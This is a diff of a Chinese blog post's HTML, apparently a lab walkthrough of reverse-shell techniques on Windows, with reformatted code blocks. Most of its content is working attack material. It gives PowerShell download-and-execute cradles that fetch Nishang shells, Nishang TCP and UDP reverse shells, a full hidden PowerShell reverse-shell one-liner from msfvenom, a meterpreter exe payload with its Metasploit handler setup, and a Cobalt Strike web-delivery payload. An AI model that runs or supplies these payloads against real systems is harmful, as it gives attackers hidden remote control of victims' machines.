+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917152419219.png" alt="image-20230917152419219"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917152426327.png" alt="image-20230917152426327"></p>
 <h3 id="3-nishang反弹">3. nishang反弹</h3>
 <p>Nishang下载地址：<code>https://github.com/samratashok/nishang</code></p>
 <p>Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell</p>
 <p>将nishang下载到攻击者本地，在目标机使用powershell执行以下命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.17.1/tools/nishang-master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.17.1/tools/nishang-master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里依旧不行，或许访问本地下载速度很慢，等了几分钟我也没见结果，因此还是直接下载到目标机执行吧。。。。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Import-Module .\Invoke-PowerShellTcp.ps1 //导入模块<br><br>#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码<br>Set-ExecutionPolicy Unrestricted<br><br>Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917155138651.png" alt="image-20230917155138651"></p>
-<p><img src="image-20230917155145623.png" alt="image-20230917155145623"></p>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-PowerShellTcp.ps1 //导入模块
+
+#如果提示未能加载指定模块，则可能是权限问题，以管理员权限运行powershell，然后输入如下代码
+Set-ExecutionPolicy Unrestricted
+
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.17.137 -port 8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917155138651.png" alt="image-20230917155138651"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917155145623.png" alt="image-20230917155145623"></p>
 <p>这个脚本linux、windows命令均可以使用</p>
 <h3 id="4-Reverse-UDP-shell">4. Reverse UDP shell</h3>
 <p>攻击机监听 nc -lvup 8888</p>
 <p>利用上面下载的还是放在攻击机上在目标机中powershell执行以下命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Import-Module .\Invoke-PowerShellUdp.ps1<br><br>Invoke-PowerShellUdp -Reverse -IPAddress 192.168.17.137 -port 8888<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917160025209.png" alt="image-20230917160025209"></p>
-<p><img src="image-20230917160031045.png" alt="image-20230917160031045"></p>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-PowerShellUdp.ps1
+
+Invoke-PowerShellUdp -Reverse -IPAddress 192.168.17.137 -port 8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917160025209.png" alt="image-20230917160025209"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917160031045.png" alt="image-20230917160031045"></p>
 <p>这里我一直没通，以为是什么别的问题，看来还是浅薄了，这里的监听命令必须为nc -lvup port，我这里一直是vnp，查询了一番发现</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-u：指定nc使用UDP协议，默认为TCP<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">-u：指定nc使用UDP协议，默认为TCP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/GNNUXXL/article/details/122299540?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169493771816800192238482%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169493771816800192238482&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122299540-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=nc%20%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0&amp;spm=1018.2226.3001.4187">nc命令用法举例</a></p>
 <h3 id="5-MSF反弹">5. MSF反弹</h3>
 <p>我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们需要的各类反弹一句话payload的路径信息。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -l payloads | grep 'cmd/windows/reverse'<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917160400321.png" alt="image-20230917160400321"></p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -l payloads | grep 'cmd/windows/reverse'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917160400321.png" alt="image-20230917160400321"></p>
 <p>这里找powershell的payload</p>
 <p>依照前面查找出的命令生成一句话payload路径，我们使用如下的命令生成反弹一句话，然后复制粘贴到靶机上运行即可。</p>
 <p><code>msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.17.137 LPORT=8888</code>  //host为被攻击机</p>
-<p><img src="image-20230917160533372.png" alt="image-20230917160533372"></p>
-<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">'192.168.17.137'</span>;<span class="hljs-variable">$b</span>=<span class="hljs-number">8888</span>;<span class="hljs-variable">$c</span>=<span class="hljs-built_in">New-Object</span> system.net.sockets.tcpclient;<span class="hljs-variable">$nb</span>=<span class="hljs-built_in">New-Object</span> System.Byte[] <span class="hljs-variable">$c</span>.ReceiveBufferSize;<span class="hljs-variable">$ob</span>=<span class="hljs-built_in">New-Object</span> System.Byte[] <span class="hljs-number">65536</span>;<span class="hljs-variable">$eb</span>=<span class="hljs-built_in">New-Object</span> System.Byte[] <span class="hljs-number">65536</span>;<span class="hljs-variable">$e</span>=<span class="hljs-built_in">new-object</span> System.Text.UTF8Encoding;<span class="hljs-variable">$p</span>=<span class="hljs-built_in">New-Object</span> System.Diagnostics.Process;<span class="hljs-variable">$p</span>.StartInfo.FileName=<span class="hljs-string">'cmd.exe'</span>;<span class="hljs-variable">$p</span>.StartInfo.RedirectStandardInput=<span class="hljs-number">1</span>;<span class="hljs-variable">$p</span>.StartInfo.RedirectStandardOutput=<span class="hljs-number">1</span>;<span class="hljs-variable">$p</span>.StartInfo.RedirectStandardError=<span class="hljs-number">1</span>;<span class="hljs-variable">$p</span>.StartInfo.UseShellExecute=<span class="hljs-number">0</span>;<span class="hljs-variable">$q</span>=<span class="hljs-variable">$p</span>.Start();<span class="hljs-variable">$is</span>=<span class="hljs-variable">$p</span>.StandardInput;<span class="hljs-variable">$os</span>=<span class="hljs-variable">$p</span>.StandardOutput;<span class="hljs-variable">$es</span>=<span class="hljs-variable">$p</span>.StandardError;<span class="hljs-variable">$osread</span>=<span class="hljs-variable">$os</span>.BaseStream.BeginRead(<span class="hljs-variable">$ob</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$ob</span>.Length, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>);<span class="hljs-variable">$esread</span>=<span class="hljs-variable">$es</span>.BaseStream.BeginRead(<span class="hljs-variable">$eb</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$eb</span>.Length, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>);<span class="hljs-variable">$c</span>.connect(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<span class="hljs-variable">$s</span>=<span class="hljs-variable">$c</span>.GetStream();<span class="hljs-keyword">while</span> (<span class="hljs-variable">$true</span>) {<span class="hljs-built_in">start-sleep</span> <span class="hljs-literal">-m</span> <span class="hljs-number">100</span>;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$osread</span>.IsCompleted <span class="hljs-operator">-and</span> <span class="hljs-variable">$osread</span>.Result <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) {<span class="hljs-variable">$r</span>=<span class="hljs-variable">$os</span>.BaseStream.EndRead(<span class="hljs-variable">$osread</span>);<span class="hljs-variable">$s</span>.Write(<span class="hljs-variable">$ob</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$r</span>);<span class="hljs-variable">$s</span>.Flush();<span class="hljs-variable">$osread</span>=<span class="hljs-variable">$os</span>.BaseStream.BeginRead(<span class="hljs-variable">$ob</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$ob</span>.Length, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>);}<span class="hljs-keyword">if</span> (<span class="hljs-variable">$esread</span>.IsCompleted <span class="hljs-operator">-and</span> <span class="hljs-variable">$esread</span>.Result <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) {<span class="hljs-variable">$r</span>=<span class="hljs-variable">$es</span>.BaseStream.EndRead(<span class="hljs-variable">$esread</span>);<span class="hljs-variable">$s</span>.Write(<span class="hljs-variable">$eb</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$r</span>);<span class="hljs-variable">$s</span>.Flush();<span class="hljs-variable">$esread</span>=<span class="hljs-variable">$es</span>.BaseStream.BeginRead(<span class="hljs-variable">$eb</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$eb</span>.Length, <span class="hljs-variable">$null</span>, <span class="hljs-variable">$null</span>);}<span class="hljs-keyword">if</span> (<span class="hljs-variable">$s</span>.DataAvailable) {<span class="hljs-variable">$r</span>=<span class="hljs-variable">$s</span>.Read(<span class="hljs-variable">$nb</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$nb</span>.Length);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$r</span> <span class="hljs-operator">-lt</span> <span class="hljs-number">1</span>) {<span class="hljs-keyword">break</span>;}<span class="hljs-keyword">else</span>{<span class="hljs-variable">$str</span>=<span class="hljs-variable">$e</span>.GetString(<span class="hljs-variable">$nb</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$r</span>);<span class="hljs-variable">$is</span>.write(<span class="hljs-variable">$str</span>);}}<span class="hljs-keyword">if</span>(<span class="hljs-variable">$c</span>.Connected <span class="hljs-operator">-ne</span> <span class="hljs-variable">$true</span> <span class="hljs-operator">-or</span> (<span class="hljs-variable">$c</span>.Client.Poll(<span class="hljs-number">1</span>,[<span class="hljs-type">System.Net.Sockets.SelectMode</span>]::SelectRead) <span class="hljs-operator">-and</span> <span class="hljs-variable">$c</span>.Client.Available <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)){<span class="hljs-keyword">break</span>;}<span class="hljs-keyword">if</span>(<span class="hljs-variable">$p</span>.ExitCode <span class="hljs-operator">-ne</span> <span class="hljs-variable">$null</span>){<span class="hljs-keyword">break</span>;}}<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917160533372.png" alt="image-20230917160533372"></p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token operator">-</span>w hidden <span class="token operator">-</span>nop <span class="token operator">-</span>c <span class="token variable">$a</span>=<span class="token string">'192.168.17.137'</span><span class="token punctuation">;</span><span class="token variable">$b</span>=8888<span class="token punctuation">;</span><span class="token variable">$c</span>=<span class="token function">New-Object</span> system<span class="token punctuation">.</span>net<span class="token punctuation">.</span>sockets<span class="token punctuation">.</span>tcpclient<span class="token punctuation">;</span><span class="token variable">$nb</span>=<span class="token function">New-Object</span> System<span class="token punctuation">.</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token variable">$c</span><span class="token punctuation">.</span>ReceiveBufferSize<span class="token punctuation">;</span><span class="token variable">$ob</span>=<span class="token function">New-Object</span> System<span class="token punctuation">.</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span> 65536<span class="token punctuation">;</span><span class="token variable">$eb</span>=<span class="token function">New-Object</span> System<span class="token punctuation">.</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span> 65536<span class="token punctuation">;</span><span class="token variable">$e</span>=<span class="token function">new-object</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>UTF8Encoding<span class="token punctuation">;</span><span class="token variable">$p</span>=<span class="token function">New-Object</span> System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span><span class="token keyword">Process</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName=<span class="token string">'cmd.exe'</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardInput=1<span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput=1<span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardError=1<span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute=0<span class="token punctuation">;</span><span class="token variable">$q</span>=<span class="token variable">$p</span><span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$is</span>=<span class="token variable">$p</span><span class="token punctuation">.</span>StandardInput<span class="token punctuation">;</span><span class="token variable">$os</span>=<span class="token variable">$p</span><span class="token punctuation">.</span>StandardOutput<span class="token punctuation">;</span><span class="token variable">$es</span>=<span class="token variable">$p</span><span class="token punctuation">.</span>StandardError<span class="token punctuation">;</span><span class="token variable">$osread</span>=<span class="token variable">$os</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>BeginRead<span class="token punctuation">(</span><span class="token variable">$ob</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$ob</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$esread</span>=<span class="token variable">$es</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>BeginRead<span class="token punctuation">(</span><span class="token variable">$eb</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$eb</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span>=<span class="token variable">$c</span><span class="token punctuation">.</span>GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">$true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">start-sleep</span> <span class="token operator">-</span>m 100<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$osread</span><span class="token punctuation">.</span>IsCompleted <span class="token operator">-and</span> <span class="token variable">$osread</span><span class="token punctuation">.</span>Result <span class="token operator">-ne</span> 0<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$r</span>=<span class="token variable">$os</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>EndRead<span class="token punctuation">(</span><span class="token variable">$osread</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$ob</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$osread</span>=<span class="token variable">$os</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>BeginRead<span class="token punctuation">(</span><span class="token variable">$ob</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$ob</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$esread</span><span class="token punctuation">.</span>IsCompleted <span class="token operator">-and</span> <span class="token variable">$esread</span><span class="token punctuation">.</span>Result <span class="token operator">-ne</span> 0<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$r</span>=<span class="token variable">$es</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>EndRead<span class="token punctuation">(</span><span class="token variable">$esread</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$eb</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$esread</span>=<span class="token variable">$es</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>BeginRead<span class="token punctuation">(</span><span class="token variable">$eb</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$eb</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">.</span>DataAvailable<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$r</span>=<span class="token variable">$s</span><span class="token punctuation">.</span>Read<span class="token punctuation">(</span><span class="token variable">$nb</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$nb</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$r</span> <span class="token operator">-lt</span> 1<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$str</span>=<span class="token variable">$e</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$nb</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$is</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span>Connected <span class="token operator">-ne</span> <span class="token boolean">$true</span> <span class="token operator">-or</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span>Client<span class="token punctuation">.</span>Poll<span class="token punctuation">(</span>1<span class="token punctuation">,</span><span class="token namespace">[System.Net.Sockets.SelectMode]</span>::SelectRead<span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token variable">$c</span><span class="token punctuation">.</span>Client<span class="token punctuation">.</span>Available <span class="token operator">-eq</span> 0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">.</span>ExitCode <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>靶机执行使用powershell执行payload，这里我一直闪退，也找不出什么原因，或许是这种方法被我的靶机识别了吧，这里采用一个生成exe文件的方式来反弹shell</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.17.137 LPORT=8888 -f exe -o payload.exe<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917164337841.png" alt="image-20230917164337841"></p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.17.137 LPORT=8888 -f exe -o payload.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917164337841.png" alt="image-20230917164337841"></p>
 <p>复制payload.exe到Windows机器，然后kali下开启msf使用如下命令监听8888端口：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs linux">msfconsole    //启动msf<br><br>use exploit/multi/handler          //使用msf的侦听模块exploit/multi/handler<br><br>set PAYLOAD windows/meterpreter/reverse_tcp        //设置载荷payload<br> <br>set LHOST 192.168.153.176               //设置本地监听机Ip<br><br>set LPORT  4444              //设置监听端口<br>     <br>exploit<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230917165804971.png" alt="image-20230917165804971"></p>
+<pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">msfconsole    //启动msf
+
+use exploit/multi/handler          //使用msf的侦听模块exploit/multi/handler
+
+set PAYLOAD windows/meterpreter/reverse_tcp        //设置载荷payload
+ 
+set LHOST 192.168.153.176               //设置本地监听机Ip
+
+set LPORT  4444              //设置监听端口
+     
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917165804971.png" alt="image-20230917165804971"></p>
 <p>设置完，在靶机上执行exe即可监听 成功</p>
-<p><img src="image-20230917165828215.png" alt="image-20230917165828215"></p>
-<p><img src="image-20230917165841402.png" alt="image-20230917165841402"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917165828215.png" alt="image-20230917165828215"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917165841402.png" alt="image-20230917165841402"></p>
 <h3 id="6-Cobalt-strike反弹shell">6. Cobalt strike反弹shell</h3>
 <p>Cobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvR32等进行反弹shell，类似metasploit的web_delivery模块</p>
 <p>运行服务端</p>
 <p><code>./teamserver 192.168.17.137 123 #123为连接密码</code></p>
-<p><img src="image-20230917172953749.png" alt="image-20230917172953749"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917172953749.png" alt="image-20230917172953749"></p>
 <p>运行客户端：</p>
 <p>Windows运行cobaltstrike.jar #用户名随便输入 密码123</p>
-<p><img src="image-20230917173049098.png" alt="image-20230917173049098"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917173049098.png" alt="image-20230917173049098"></p>
 <p>开启监听:</p>
 <p>点击Cobalt Strike-&gt;Listeners</p>
 <p>payload可选择windows/beacon_http/reverse_http</p>
 <p>说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器。</p>
-<p><img src="image-20230917173459042.png" alt="image-20230917173459042"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917173459042.png" alt="image-20230917173459042"></p>
 <p>这里name随便，ip写服务器端，端口自定义</p>
 <p>生成powershell payload:</p>
 <p>点击Attack -&gt;Scripted Web Delivery</p>
 <p>Type选择 powershell</p>
-<p><img src="image-20230917173738085.png" alt="image-20230917173738085"></p>
-<p><img src="image-20230917173809592.png" alt="image-20230917173809592"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917173738085.png" alt="image-20230917173738085"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917173809592.png" alt="image-20230917173809592"></p>
 <p>payload为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.17.137:5566/a'))"<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.17.137:5566/a'))"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>生成代码已经给出了，在windows上执行</p>
-<p><img src="image-20230917174044292.png" alt="image-20230917174044292"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917174044292.png" alt="image-20230917174044292"></p>
 <p>我是在上图位置执行的，不知道其他地方行不行。</p>
-<p><img src="image-20230917174124568.png" alt="image-20230917174124568"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917174124568.png" alt="image-20230917174124568"></p>
 <p>不过看见同一电脑上线两次，估计cmd里面执行也可</p>
-<p><img src="image-20230917174350601.png" alt="image-20230917174350601"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917174350601.png" alt="image-20230917174350601"></p>
 <p>右键点击interact进入shell，这里ipconfig等命令无法执行，应该是提权才能执行吧，这里不深入了</p>
 <p>这次写的反弹shell只是想有一个总体的了解，过程坎坷，不过我们不应该因为步骤复杂或者遇到困难而妥协，在过程中遇到问题解决问题同样可以学到东西。本次文章也有欠缺，不够完美，后续深入学习在继续更新吧。</p>
 <p>等等，有强迫症的我，了解了一下为何上述命令无法执行，因为某些命令只是cs自带的，那么ipconfig这种cs就没有，我们需要在前面加入shell即可执行</p>
-<p><img src="image-20230917175205836.png" alt="image-20230917175205836"></p>
+<p><img src="/2023/09/17/fan-dan-shell-de-fang-fa-zong-jie/image-20230917175205836.png" alt="image-20230917175205836"></p>
 <h2 id="五、参考文章">五、参考文章</h2>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37638874/article/details/126723963?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169491442916800227425621%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=169491442916800227425621&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-126723963-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=kali%E5%A6%82%E6%B2%A1%E6%9C%89%2Fdev%2Ftcp%E6%96%87%E4%BB%B6%E5%A4%B9&amp;spm=1018.2226.3001.4187">反弹shell bash -i命令</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43199509/article/details/120028288?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169491448416800215020886%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169491448416800215020886&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-120028288-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=kali%E6%B2%A1%E6%9C%89%2Fdev%2Ftcp%E6%96%87%E4%BB%B6%E5%A4%B9&amp;spm=1018.2226.3001.4187">反弹shell失败 原来是这个原因</a></p>
@@ -825,100 +808,7 @@
                 </div>
             </div>
             
-                <style>
-    #reward {
-        margin: 40px 0;
-        text-align: center;
